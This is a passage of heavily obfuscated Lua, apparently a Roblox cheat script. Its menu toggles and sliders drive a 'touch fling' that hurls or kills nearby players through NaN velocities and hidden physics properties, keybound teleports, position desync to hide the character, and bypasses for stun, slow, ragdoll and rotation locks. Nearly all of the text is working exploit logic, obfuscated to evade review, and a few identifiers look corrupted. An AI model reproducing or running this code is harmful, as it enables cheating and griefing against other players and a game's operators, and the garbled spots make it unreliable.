 ) pcall( function () _lIIlIlIIlI.CFrame = CFrame.new(0x0, -0x2710, 0x0) end
 ) pcall( function () _lIIlIlIIlI:Destroy() end
 ) _lIIlIlIIlI = nil end
 if _IIlIllIlIl and _IIlIllIlIl.Parent then pcall( function () sethiddenproperty(_IIlIllIlIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IIlIllIlIl.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIlIllIlIl.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _IIlIllIlIl.RotVelocity = Vector3.zero end
 ) end
 task.spawn( function () RunService.Heartbeat:Wait() if _IllIIlIllI then return end
 local _lIlllllIll = _llIlIIlIll.Character local _IlllIIlIlI = _lIlllllIll and _lIlllllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IIIlIIlIII = _lIlllllIll and _lIlllllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IlllIIlIlI then pcall( function () sethiddenproperty(_IlllIIlIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IIIlIIlIII then pcall( function () _IIIlIIlIII:ChangeState(Enum.HumanoidStateType.GettingUp) end
 ) end
 if _IIlIllIlIl and _IIlIllIlIl.Parent then pcall( function () sethiddenproperty(_IIlIllIlIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _IIlIllIlIl.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _IIlIllIlIl.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _IIlIllIlIl.Velocity = Vector3.zero end
 ) pcall( function () _IIlIllIlIl.RotVelocity = Vector3.zero end
 ) end
 end
 ) end
 _llIIIIlllI = _IlIIIllIIl local function _llIlllIIII(_lIlIllIlIl) for _lIIlIllIlI, _lIllllllII in pairs(Players:GetPlayers()) do if _lIllllllII ~= _llIlIIlIll and _lIllllllII.Character then local _IllllIllIl = _lIllllllII.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIIllllII = _lIllllllII.Character:FindFirstChild("\072\117\109\097\110\111\105\100") if _IllllIllIl and _IllllIllIl.Parent and _llIIllllII and _llIIllllII.Health > 0x0 then if (_IllllIllIl.Position - _lIlIllIlIl.Position).Magnitude <= _IlIIllllII then return _IllllIllIl end
 end
 end
 end
 end
 local function _lIlIIllIII() local _lIIlIIlllI = Instance.new("\080\097\114\116") _lIIlIIlllI.Size = Vector3.new(0x8, 0.2, 0x8) _lIIlIIlllI.Transparency = 0x1 _lIIlIIlllI.CanCollide = false _lIIlIIlllI.Name = game:GetService("\072\116\116\112\083\101\114\118\105\099\101"):GenerateGUID() _lIIlIIlllI.Parent = workspace return _lIIlIIlllI end
 local function _IlIIlllIII() if _IIIllIIlll.Unloaded then _IlIIIllIIl() if _lIIlIllIlI then _lIIlIllIlI:Disconnect() _lIIlIllIlI = nil end
 return end
 local _llIlIIllIl = _lIIlIllIlI.TouchFlingMethod and _lIIlIllIlI.TouchFlingMethod.Value or "\078\111\114\109\097\108" local _llIlIlIIII = _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103"] and _llIlIIllIl == "\068\101\097\116\104" if not _llIlIlIIII then if _IIIIIllIlI then _IlIIIllIIl() _IIIIIllIlI = false end
 return end
 if _llllIlllll then if _IIIIIllIlI then _IlIIIllIIl() _IIIIIllIlI = false end
 return end
 _IIIIIllIlI = true local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IlIlIllIll and _IIIlIIIIIl and _IllIllIIll) or _IllIllIIll.Health <= 0x0 then _IlIIIllIIl() return end
 local _lllllIIllI = 0x0/0x0 local _IlllllIllI = Vector3.new(_lllllIIllI, _lllllIIllI, _lllllIIllI) if not _lIIlIlIIlI then _lIIlIlIIlI = _lIlIIllIII() end
 if _llIlIIllIl == "\068\101\097\116\104" then if not _lIllIIIllI then local _lIIlIIlIII = _llIlllIIII(_IIIlIIIIIl) if _lIIlIIlIII ~= _lllIlllllI then if _lllIlllllI and _lllIlllllI.Parent then pcall( function () sethiddenproperty(_lllIlllllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lllIlllllI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lllIlllllI.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lllIlllllI.Velocity = Vector3.zero end
 ) pcall( function () _lllIlllllI.RotVelocity = Vector3.zero end
 ) end
 if not _IllIIlIllI then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _lllIlllllI = _lIIlIIlIII end
 if _lIIlIIlIII and _lIIlIIlIII.Parent then if not _IllIIlIllI then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIIlIIlIII) end
 ) end
 sethiddenproperty(_IllIllIIll, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", _IlllllIllI) _IIIlIIIIIl.AssemblyLinearVelocity = _IlllllIllI _IIIlIIIIIl.AssemblyAngularVelocity = _IlllllIllI else if _lIIlIlIIlI then pcall( function () sethiddenproperty(_lIIlIlIIlI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lIIlIlIIlI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lIIlIlIIlI.AssemblyAngularVelocity = Vector3.zero end
 ) _lIIlIlIIlI.Anchored = true _lIIlIlIIlI.CFrame = CFrame.new(0x0, -0x3E8, 0x0) end
 end
 else local _lIIlIIlIII = _llIlllIIII(_IIIlIIIIIl) if _lIIlIIlIII ~= _lllIlllllI then if _lllIlllllI and _lllIlllllI.Parent then pcall( function () sethiddenproperty(_lllIlllllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) pcall( function () _lllIlllllI.AssemblyLinearVelocity = Vector3.zero end
 ) pcall( function () _lllIlllllI.AssemblyAngularVelocity = Vector3.zero end
 ) pcall( function () _lllIlllllI.Velocity = Vector3.zero end
 ) pcall( function () _lllIlllllI.RotVelocity = Vector3.zero end
 ) end
 if not _IllIIlIllI then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 _lllIlllllI = _lIIlIIlIII end
 if _lIIlIIlIII and _lIIlIIlIII.Parent then _lIIlIlIIlI.Anchored = false _lIIlIlIIlI.CFrame = _lIIlIIlIII.CFrame * CFrame.new(0x0, -3.2, 0x0) if not _IllIIlIllI then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIIlIIlIII) end
 ) end
 sethiddenproperty(_IllIllIIll, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", _IlllllIllI) _IIIlIIIIIl.AssemblyLinearVelocity = _IlllllIllI _IIIlIIIIIl.AssemblyAngularVelocity = _IlllllIllI _lIIlIlIIlI.AssemblyLinearVelocity = _IlllllIllI mblyAngularVelocity = _IlllllIllI else _lIIlIlIIlI.Anchored = false _lIIlIlIIlI.CFrame = _IIIlIIIIIl.CFrame * CFrame.new(0x0, -3.2, 0x0) if not _IllIIlIllI then pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lIIlIlIIlI) end
 ) end
 sethiddenproperty(_IllIllIIll, "\077\111\118\101\068\105\114\101\099\116\105\111\110\073\110\116\101\114\110\097\108", _IlllllIllI) _IIIlIIIIIl.AssemblyLinearVelocity = _IlllllIllI _IIIlIIIIIl.AssemblyAngularVelocity = _IlllllIllI _lIIlIlIIlI.AssemblyLinearVelocity = _IlllllIllI _lIIlIlIIlI.AssemblyAngularVelocity = _IlllllIllI end
 end
 end
 end
 local function _IllIIIIlIl() if not _lIIlIlIIlI then _lIIlIlIIlI = _lIlIIllIII() end
 if not _lIIlIllIlI then _lIIlIllIlI = RunService.RenderStepped:Connect(_IlIIlllIII) end
 end
 _IllIlIIIII = _IllIIIIlIl table.insert(_IllIllIIll, function () _IlIIIllIIl() if _lIIlIllIlI then _lIIlIllIlI:Disconnect() _lIIlIllIlI = nil end
 if _lllIlllIII then pcall( function () _lllIlllIII:Disconnect() end
 ) _lllIlllIII = nil end
 end
 ) end
 _llllIIlllI:AddInput("\084\111\117\099\104\070\108\105\110\103\088\073\110\112\117\116", { Text = "\088\032\086\097\108\117\101", Default = "\048", Numeric = true, Finished = false, Callback = function (_IIlIlIIlII) local _IllIIlllIl = tonumber(_IIlIlIIlII) if _IllIIlllIl then _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_IllIIlllIl, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) if _lIIlIllIlI.TouchFlingX and _lIIlIllIlI.TouchFlingX.SetValue then pcall( function () _lIIlIllIlI.TouchFlingX:SetValue(math.clamp(_IllIIlllIl, 0x0, 1e38)) end
 ) end
 end
 end
 , }) _llllIIlllI:AddSlider("\084\111\117\099\104\070\108\105\110\103\088", { Text = "\088", Default = 0x0, Min = 0x0, Max = 1e38, Rounding = 0x1, Compact = true, Callback = function (tfX) _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(tfX, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) end
 , }) _llllIIlllI:AddInput("\084\111\117\099\104\070\108\105\110\103\089\073\110\112\117\116", { Text = "\089\032\086\097\108\117\101", Default = "\048", Numeric = true, Finished = false, Callback = function (_IIlIlIIlII) local _IllIIlllIl = tonumber(_IIlIlIIlII) if _IllIIlllIl then _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, _IllIIlllIl, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) if _lIIlIllIlI.TouchFlingY and _lIIlIllIlI.TouchFlingY.SetValue then pcall( function () _lIIlIllIlI.TouchFlingY:SetValue(math.clamp(_IllIIlllIl, 0x0, 1e38)) end
 ) end
 end
 end
 , }) _llllIIlllI:AddSlider("\084\111\117\099\104\070\108\105\110\103\089", { Text = "\089", Default = 0x0, Min = 0x0, Max = 1e38, Rounding = 0x1, Compact = true, Callback = function (tfY) _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, tfY, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Z) end
 , }) _llllIIlllI:AddInput("\084\111\117\099\104\070\108\105\110\103\090\073\110\112\117\116", { Text = "\090\032\086\097\108\117\101", Default = "\048", Numeric = true, Finished = false, Callback = function (_IIlIlIIlII) local _IllIIlllIl = tonumber(_IIlIlIIlII) if _IllIIlllIl then _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, _IllIIlllIl) if _lIIlIllIlI.TouchFlingZ and _lIIlIllIlI.TouchFlingZ.SetValue then pcall( function () _lIIlIllIlI.TouchFlingZ:SetValue(math.clamp(_IllIIlllIl, 0x0, 1e38)) end
 ) end
 end
 end
 , }) _llllIIlllI:AddSlider("\084\111\117\099\104\070\108\105\110\103\090", { Text = "\090", Default = 0x0, Min = 0x0, Max = 1e38, Rounding = 0x1, Compact = true, Callback = function (tfZ) _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(_lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].X, _lIIIllIlIl["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"].Y, tfZ) end
 , }) task.defer( function () _lllllIllII(true) end
 ) _llllIIlllI:AddDivider() local _IlllIlllIl = _llllIIlllI:AddToggle("\084\111\103\087\101\108\100", { Text = _IlllIlIlII and "\065\116\116\097\099\104" or "\079\114\098\105\116", Default = false, Callback = function (weldToggleVal) if _IllllIlIII.Weld then return end
 if not weldToggleVal then if _lIIlIllIlI.KPWeld then _lIIlIllIlI.KPWeld.Toggled = false end
 if _IllIIlIllI then _IIIlIlIlll() end
 end
 end
 , }) _IlllIlllIl:AddKeyPicker("\075\080\087\101\108\100", { Default = "\072", Text = _IlllIlIlII and "\065\116\116\097\099\104" or "\079\114\098\105\116", SyncToggleState = false, Mode = "\084\111\103\103\108\101", NoUI = false, Callback = function (kpVal) if _IllllIlIII.Weld then return end
 if kpVal and not _llIIllIlll.TogWeld.Value then RunService.RenderStepped:Wait() _IllllIlIII.Weld = true _lIIlIllIlI.KPWeld.Toggled = false _lIIlIllIlI.KPWeld:DoClick() _IllllIlIII.Weld = false return end
 if not _llIIllIlll.TogWeld.Value then return end
 if _IlIlIllIII() then return end
 _IIIlIlIlll() end
 , }) if _IlllIlIlII then _llllIIlllI:AddDropdown("\065\116\116\097\099\104\077\101\116\104\111\100", { Text = "\077\101\116\104\111\100", Values = { "\083\116\114\101\110\103\116\104", "\072\105\116\098\111\120\032\065\099\099\117\114\097\116\101", "\079\114\098\105\116" }, Default = "\083\116\114\101\110\103\116\104", Callback = function (_IIlIlIIlII) local _IIlIIllIll = _IIlIlIIlII == "\079\114\098\105\116" pcall( function () _lIIlIllIlI.WeldOffsetX:SetVisible( not _IIlIIllIll) end
 ) pcall( function () _lIIlIllIlI.WeldOffsetY:SetVisible( not _IIlIIllIll) end
 ) pcall( function () _lIIlIllIlI.WeldOffsetZ:SetVisible( not _IIlIIllIll) end
 ) pcall( function () _lIIlIllIlI.AttachOrbitSpeed:SetVisible(_IIlIIllIll) end
 ) pcall( function () _lIIlIllIlI.AttachOrbitDistance:SetVisible(_IIlIIllIll) end
 ) end
 , }) _llllIIlllI:AddSlider("\087\101\108\100\079\102\102\115\101\116\088", { Text = "\065\116\116\097\099\104\032\088", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x0 }) _llllIIlllI:AddSlider("\087\101\108\100\079\102\102\115\101\116\089", { Text = "\065\116\116\097\099\104\032\089", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x0 }) _llllIIlllI:AddSlider("\087\101\108\100\079\102\102\115\101\116\090", { Text = "\065\116\116\097\099\104\032\090", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x0 }) _llllIIlllI:AddSlider("\065\116\116\097\099\104\079\114\098\105\116\083\112\101\101\100", { Text = "\079\114\098\105\116\032\083\112\101\101\100", Default = 0xA, Min = 0x1, Max = 0x64, Rounding = 0x1, }) _llllIIlllI:AddSlider("\065\116\116\097\099\104\079\114\098\105\116\068\105\115\116\097\110\099\101", { Text = "\079\114\098\105\116\032\068\105\115\116\097\110\099\101", Default = 0x3, Min = 0x1, Max = 0x64, Rounding = 0x1, }) task.defer( function () pcall( function () _lIIlIllIlI.AttachOrbitSpeed:SetVisible(false) end
 ) pcall( function () _lIIlIllIlI.AttachOrbitDistance:SetVisible(false) end
 ) end
 ) else _llllIIlllI:AddSlider("\079\114\098\105\116\083\112\101\101\100", { Text = "\079\114\098\105\116\032\083\112\101\101\100", Default = 0xA, Min = 0x1, Max = 0x64, Rounding = 0x1, }) _llllIIlllI:AddSlider("\079\114\098\105\116\068\105\115\116\097\110\099\101", { Text = "\079\114\098\105\116\032\068\105\115\116\097\110\099\101", Default = 0x3, Min = 0x1, Max = 0x64, Rounding = 0x1, }) end
 _llllIIlllI:AddDivider() local _IIIlllIlIl = _llllIIlllI:AddToggle("\084\080\049", { Text = "\084\101\108\101\112\111\114\116\032\049", Default = false, Callback = function (_IIlIlIIlII) if not _IIlIlIIlII and _lIIlIllIlI.TP1Bind:GetState() == true then _lIIlIllIlI.TP1Bind.Toggled = false _lIIlIllIlI.TP1Bind:DoClick() end
 pcall( function () _lIIlIllIlI.TP1Bind.KeybindsToggle:SetVisibility(_IIlIlIIlII) end
 ) end
 , }) _IIIlllIlIl:AddKeyPicker("\084\080\049\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\069", Text = "\084\101\108\101\112\111\114\116\032\049", Callback = function () _lIIlIllIlI.TP1Bind.Toggled = false if not _llIIllIlll.TP1 or not _llIIllIlll.TP1.Value then return end
 local _IlIlIllIll = _lIlIIIIlII(_llIlIIlIll) local _IIIlIIIIIl = _IlIlIllIll and _lIlIlIIlII(_IlIlIllIll) local _IllIllIIll = _IlIlIllIll and _IIIlIIIIll(_IlIlIllIll) if _IlIlIllIll and _IIIlIIIIIl and _IllIllIIll and _IllIllIIll.Health > 0x0 then local _llIllIlIll = _IIIlIIIIIl.CFrame * CFrame.new(_lIIlIllIlI.TP1X.Value, _lIIlIllIlI.TP1Y.Value, _lIIlIllIlI.TP1Z.Value) _IIlllIIlIl(_llIllIlIll) end
 end
 , }) _llllIIlllI:AddSlider("\084\080\049\088", { Text = "\088", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _llllIIlllI:AddSlider("\084\080\049\089", { Text = "\089", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _llllIIlllI:AddSlider("\084\080\049\090", { Text = "\090", Default = 0x14, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _llllIIlllI:AddDivider() local _lIlIIlllII = _llllIIlllI:AddToggle("\084\080\050", { Text = "\084\101\108\101\112\111\114\116\032\050", Default = false, Callback = function (_IIlIlIIlII) if not _IIlIlIIlII and _lIIlIllIlI.TP2Bind:GetState() == true then _lIIlIllIlI.TP2Bind.Toggled = false _lIIlIllIlI.TP2Bind:DoClick() end
 pcall( function () _lIIlIllIlI.TP2Bind.KeybindsToggle:SetVisibility(_IIlIlIIlII) end
 ) end
 , }) _lIlIIlllII:AddKeyPicker("\084\080\050\066\105\110\100", { SyncToggleState = false, Mode = "\084\111\103\103\108\101", Default = "\082", Text = "\084\101\108\101\112\111\114\116\032\050", Callback = function () _lIIlIllIlI.TP2Bind.Toggled = false if not _llIIllIlll.TP2 or not _llIIllIlll.TP2.Value then return end
 local _IlIlIllIll = _lIlIIIIlII(_llIlIIlIll) local _IIIlIIIIIl = _IlIlIllIll and _lIlIlIIlII(_IlIlIllIll) local _IllIllIIll = _IlIlIllIll and _IIIlIIIIll(_IlIlIllIll) if _IlIlIllIll and _IIIlIIIIIl and _IllIllIIll and _IllIllIIll.Health > 0x0 then local _llIllIlIll = _IIIlIIIIIl.CFrame * CFrame.new(_lIIlIllIlI.TP2X.Value, _lIIlIllIlI.TP2Y.Value, _lIIlIllIlI.TP2Z.Value) _IIlllIIlIl(_llIllIlIll) end
 end
 , }) _llllIIlllI:AddSlider("\084\080\050\088", { Text = "\088", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _llllIIlllI:AddSlider("\084\080\050\089", { Text = "\089", Default = 0x0, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) _llllIIlllI:AddSlider("\084\080\050\090", { Text = "\090", Default = -0x14, Min = -0x19, Max = 0x19, Rounding = 0x1, Compact = true }) task.defer( function () pcall( function () _lIIlIllIlI.TP1Bind.KeybindsToggle:SetVisibility(false) end
 ) pcall( function () _lIIlIllIlI.TP2Bind.KeybindsToggle:SetVisibility(false) end
 ) end
 ) if _lllIIllIII then _IlIlIIIlIl:AddToggle("\067\117\115\116\111\109\070\114\111\110\116\068\097\115\104", { Text = "\067\117\115\116\111\109\032\070\114\111\110\116\032\068\097\115\104", Default = false, }) _IlIlIIIlIl:AddSlider("\070\068\068\105\115\116\097\110\099\101", { Text = "\070\114\111\110\116\032\068\097\115\104\032\068\105\115\116\097\110\099\101", Default = 0xA5, Min = 0x0, Max = 0x1F4, Rounding = 0x1, }) _IlIlIIIlIl:AddToggle("\067\117\115\116\111\109\083\105\100\101\068\097\115\104", { Text = "\067\117\115\116\111\109\032\083\105\100\101\032\068\097\115\104", Default = false, }) _IlIlIIIlIl:AddSlider("\083\068\068\105\115\116\097\110\099\101", { Text = "\083\105\100\101\032\068\097\115\104\032\068\105\115\116\097\110\099\101\032\040\077\117\108\116\105\112\108\105\101\114\041", Default = 0x1, Min = 0.1, Max = 0x2, Rounding = 0x1, }) _IlIlIIIlIl:AddSlider("\083\068\083\112\101\101\100", { Text = "\083\105\100\101\032\068\097\115\104\032\083\112\101\101\100", Default = 0x1, Min = 0.1, Max = 0x2, Rounding = 0x1, Tooltip = "\082\101\099\111\109\109\101\110\100\101\100\032\119\105\116\104\032\099\117\115\116\111\109\032\115\105\100\101\032\100\097\115\104\032\115\112\101\101\100\032\115\101\116\032\116\111\032\049\046\052\046", }) _IlIlIIIlIl:AddToggle("\067\117\115\116\111\109\066\097\099\107\068\097\115\104", { Text = "\067\117\115\116\111\109\032\066\097\099\107\032\068\097\115\104", Default = false, }) _IlIlIIIlIl:AddSlider("\066\068\068\105\115\116\097\110\099\101", { Text = "\066\097\099\107\032\068\097\115\104\032\068\105\115\116\097\110\099\101\032\040\077\117\108\116\105\112\108\105\101\114\041", Default = 0x1, Min = 0.1, Max = 0x2, Rounding = 0x1, }) _IlIlIIIlIl:AddButton({ Text = "\082\101\115\101\116\032\116\111\032\068\101\102\097\117\108\116\115", Func = function () _lIIlIllIlI.FDDistance:SetValue(0xA5) _lIIlIllIlI.SDDistance:SetValue(0x1) _lIIlIllIlI.SDSpeed:SetValue(0x1) _lIIlIllIlI.BDDistance:SetValue(0x1) end
 , }) local function _lIIlIIIlII(_lIIlIllIlI) for _lIIlIllIlI, _IllIIlIllI in pairs(_llIIIIlIIl) do _IllIIlIllI:Disconnect() end
 table.clear(_llIIIIlIIl) if _lllllllIll then _lllllllIll:Destroy() _lllllllIll = nil end
 repeat task.wait() until _lIlIIIIlII(_llIlIIlIll) and _lIlIlIIlII(_lIlIIIIlII(_llIlIIlIll)) and _IIIlIIIIll(_lIlIIIIlII(_llIlIIlIll)) local _llIlIIIIll = _lIlIIIIlII(_llIlIIlIll) local _lIllIIIIll = _llIlIIIIll and _lIlIlIIlII(_llIlIIIIll) or _llIlIIIIll local _lIlllIllII = _llIlIIIIll and _IIIlIIIIll(_llIlIIIIll) or _llIlIIIIll if _llIlIIIIll and _lIllIIIIll and _lIlllIllII then local _lIIIIIIIIl = {} _llIIIIlIIl[#_llIIIIlIIl+0x1] = _llIlIIIIll.DescendantAdded:Connect( function (descendant) if descendant:IsA("\083\111\117\110\100") and descendant.SoundId:match("\049\054\049\051\057\055\053\051\048\057\056") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\067\114\117\115\104\105\110\103\032\080\117\108\108") then local _lIIIllllII = tick() repeat _IllIIIIIlI({ Goal = "\075\101\121\080\114\101\115\115", Key = Enum.KeyCode.F }) RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0.5 _IllIIIIIlI({ Goal = "\075\101\121\082\101\108\101\097\115\101", Key = Enum.KeyCode.F }) elseif _lIIIllIlIl["\085\112\115\105\100\101\032\068\111\119\110"] and _lIlllIllII and _lIlllIllII.Health > 0x0 then elseif descendant:IsA("\065\099\099\101\115\115\111\114\121") then if table.find({"\083\108\111\119\101\100","\083\116\111\112\082\117\110\110\105\110\103","\067\111\109\098\111\083\116\117\110"}, descendant.Name) and rawget(_lIIlIllIlI.CharacterExploits.Value, "\078\111\032\083\108\111\119") then if descendant.Name ~= "\083\108\111\119\101\100" then if descendant.Name == "\083\116\111\112\082\117\110\110\105\110\103" or descendant.Name == "\067\111\109\098\111\083\116\117\110" then _IIllIlllll(descendant, false) end
 else local _llIllIIlII = _lIlllIllII:GetPropertyChangedSignal("\087\097\108\107\083\112\101\101\100"):Connect( function () _lIlllIllII.WalkSpeed = _llIlIIIIll:GetAttribute("\085\108\116\101\100") and (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) end
 ) _lIlllIllII.WalkSpeed = _llIlIIIIll:GetAttribute("\085\108\116\101\100") and (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) repeat RunService.RenderStepped:Wait() until descendant.Parent ~= _llIlIIIIll _llIllIIlII:Disconnect() end
 elseif (descendant.Name == "\070\114\101\101\122\101" or descendant.Name == "\065\110\116\105\077\111\118\101") and rawget(_lIIlIllIlI.CharacterExploits.Value, "\078\111\032\083\116\117\110") then local _IIIIlllIlI = _lIlllIllII:GetPropertyChangedSignal("\087\097\108\107\083\112\101\101\100"):Connect( function () _lIlllIllII.WalkSpeed = _llIlIIIIll:GetAttribute("\085\108\116\101\100") and (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) end
 ) _lIlllIllII.WalkSpeed = _llIlIIIIll:GetAttribute("\085\108\116\101\100") and (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x20 or 0x10) or (_llIlIIIIll:GetAttribute("\082\117\110\110\105\110\103") and 0x19 or 0x10) repeat RunService.RenderStepped:Wait() until descendant.Parent ~= _llIlIIIIll _IIIIlllIlI:Disconnect() elseif descendant.Name ~= "\078\111\074\117\109\112" or not rawget(_lIIlIllIlI.CharacterExploits.Value, "\078\111\032\074\117\109\112\032\066\121\112\097\115\115") then if (descendant.Name == "\078\111\082\111\116\097\116\101" or desceame == "\078\111\082\111\116\097\116\101" or descendant.Name == "\078\111\082\111\116\097\116\101\085\108\116\105\109\097\116\101") and rawget(_lIIlIllIlI.CharacterExploits.Value, "\078\111\032\082\111\116\097\116\105\111\110\115\032\066\121\112\097\115\115") then task.spawn(pcall, _IIllIlllll, descendant, false) elseif descendant.Name ~= "\082\097\103\100\111\108\108" then if descendant.Name ~= "\082\097\103\100\111\108\108\083\105\109" then if descendant.Name ~= "\066\101\105\110\103\076\097\117\110\099\104\101\100" then if descendant.Name == "\084\104\114\111\119\084\114\097\115\104\099\097\110" then _lIIIllIlIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = true task.wait(0.25) _lIIIllIlIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false end
 elseif _llIIllIlll.LaunchHide.Value and _lIlllIllII.Health > 0x0 and not _llIlIIIIll:FindFirstChild("\069\120\116\114\097\072\105\116\098\111\120") then local _IIIIIllIll = tick() repeat getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait() until tick() >= _IIIIIllIll + 0x3 or (_llIlIIIIll:FindFirstChild("\076\097\117\110\099\104\069\110\100\101\100") or _lIlllIllII.Health <= 0x0) getgenv().desync = nil end
 elseif rawget(_lIIlIllIlI.CharacterExploits.Value, "\065\110\116\105\032\082\097\103\100\111\108\108") then task.spawn(pcall, _IIllIlllll, descendant, false) end
 else if rawget(_lIIlIllIlI.CharacterExploits.Value, "\065\110\116\105\032\082\097\103\100\111\108\108") then descendant:Remove() end
 if _llIIllIlll.RagdollHide.Value and _lIlllIllII.Health > 0x0 and not _llIlIIIIll:FindFirstChild("\069\120\116\114\097\072\105\116\098\111\120") then task.spawn( function () repeat getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait() until not _llIIllIlll.RagdollHide.Value or descendant.Parent ~= _llIlIIIIll or _lIlllIllII.Health <= 0x0 getgenv().desync = nil end
 ) end
 if _llIIllIlll.AutoRagdollCancel.Value then _IllIIIIIlI({ Dash = Enum.KeyCode.S, Key = Enum.KeyCode.Q, Goal = "\075\101\121\080\114\101\115\115" }) end
 end
 else task.spawn(pcall, _IIllIlllll, descendant, false) end
 end
